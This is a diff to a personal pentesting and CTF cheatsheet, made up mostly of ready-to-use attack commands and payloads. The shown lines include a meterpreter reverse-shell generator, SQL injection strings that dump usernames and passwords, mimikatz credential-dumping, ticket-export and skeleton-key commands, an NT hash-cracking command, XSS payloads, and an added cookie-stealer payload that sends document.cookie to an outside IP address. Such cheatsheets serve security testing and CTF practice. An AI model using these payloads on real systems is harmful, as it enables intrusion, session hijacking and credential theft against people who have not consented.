@@ -9,9 +9,10 @@ GitHub: https://github.com/Leetcore/1337-observer
 This file is my cheatsheet for pentesting and CTFs.
 
 If you read with `less` type `-i` (ignore case) before searching.
+
 Type `/nc` to search.
 
-# 🔥 HOT HOT HOT
+ 🔥 HOT HOT HOT
 In this file: log4shell (java), printnightmare (windows), pwnkit (linux).
 
 # ENCODING (encoding, enc)
@@ -43,6 +44,8 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=1338 -f 
 # Python webserver
 Host files (bash):
 python3 -m http.server 8080
+
+zip -r all.zip *
 
 # WinPeas in memory (windows, security tool)
 Download:
@@ -137,9 +140,9 @@ Check for SQLi:
 
 Check columns:
 id=1 order by 5
-id=1 union select 1,2,3,4
-id=1 union select 1,2,version(),4
-id=1 union select 1,2,user(),4
+id=-1 union select 1,2,3,4
+id=-1 union select 1,2,version(),4
+id=-1 union select 1,2,user(),4
 id=1 union all select 1,2,group_concat(table_name),4 from information_schema.tables where table_schema=database() --+
 id=1 union all select 1,,2,group_concat(column_name),4 from information_schema.columns where table_schema=database() and table_name='users'--+
 id=1 union all select group_concat(id),group_concat(username),group_concat(password) from users where table_schema=database()--+
@@ -328,7 +331,11 @@ Get-NetGroup -GroupName *admin*
 
 # MIMIKATZ
 In mimikatz:
-mimikatz.exe, `privilege::debug` = 20?
+privilege::debug = 20?
+token:elevate
+lsadump::sam
+
+john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT thomas.hash
 
 Export ticket:
 sekurlsa::tickets /export
@@ -356,7 +363,7 @@ Skeleton key (every User-PW: mimikatz):
 In mimikatz:
 misc::skeleton
 
-# XSS
+# XSS (xss)
 html
 "'><script>alert(1)</script>
 "';</script><script>alert(/XSS/)</script><"
@@ -370,6 +377,11 @@ html
 %22%27%3E%3C%68%31%3E%78%73%73%3C%2F%68%31%3E
 &#x22;&#x27;&#x3E;&#x3C;&#x68;&#x31;&#x3E;&#x78;&#x73;&#x73;&#x3C;&#x2F;&#x68;&#x31;&#x3E;
 &#34&#39&#62&#60&#104&#49&#62&#120&#115&#115&#60&#47&#104&#49&#62
+
+# COOKIE STEALER
+
+"'><img src=1337xx onerror=this.src='http://10.8.10.59:8080/?'+document.cookie;>
+
 
 # XXE (XML external entities):
 In XML:
